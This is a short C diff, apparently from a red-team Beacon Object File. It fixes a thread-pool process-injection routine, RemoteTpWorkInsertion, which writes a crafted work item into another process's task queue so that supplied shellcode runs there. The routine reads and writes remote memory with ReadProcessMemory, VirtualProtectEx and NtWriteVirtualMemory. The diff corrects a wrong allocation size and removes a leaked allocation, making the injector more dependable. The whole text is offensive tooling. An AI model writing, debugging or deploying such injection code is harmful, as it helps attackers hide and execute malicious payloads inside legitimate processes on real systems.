@@ -6,7 +6,7 @@ void RemoteTpWorkInsertion(HANDLE hTarget, PVOID pShellcodeAddress) {
     WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = GetWorkerFactoryBasicInformation();
     
     PFULL_TP_POOL TargetTpPool = NULL;
-    TargetTpPool = (PFULL_TP_POOL)MSVCRT$calloc(1, sizeof(PFULL_TP_POOL));
+    TargetTpPool = (PFULL_TP_POOL)MSVCRT$calloc(1, sizeof(FULL_TP_POOL));
     SIZE_T stBytesRead = 0;
     KERNEL32$ReadProcessMemory(hTarget, WorkerFactoryInformation.StartParameter, TargetTpPool, sizeof(FULL_TP_POOL), &stBytesRead);
 
@@ -25,7 +25,6 @@ void RemoteTpWorkInsertion(HANDLE hTarget, PVOID pShellcodeAddress) {
     KERNEL32$VirtualProtectEx(hTarget, pRemoteTpWork, sizeof(FULL_TP_WORK), PAGE_EXECUTE_READ, &dwOldProtect);
 
     PLIST_ENTRY RemoteWorkItemTaskList = NULL;
-    RemoteWorkItemTaskList = (PLIST_ENTRY)MSVCRT$calloc(1, sizeof(PLIST_ENTRY));
     RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;
 
     NtWriteVirtualMemory(hTarget, &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), NULL);
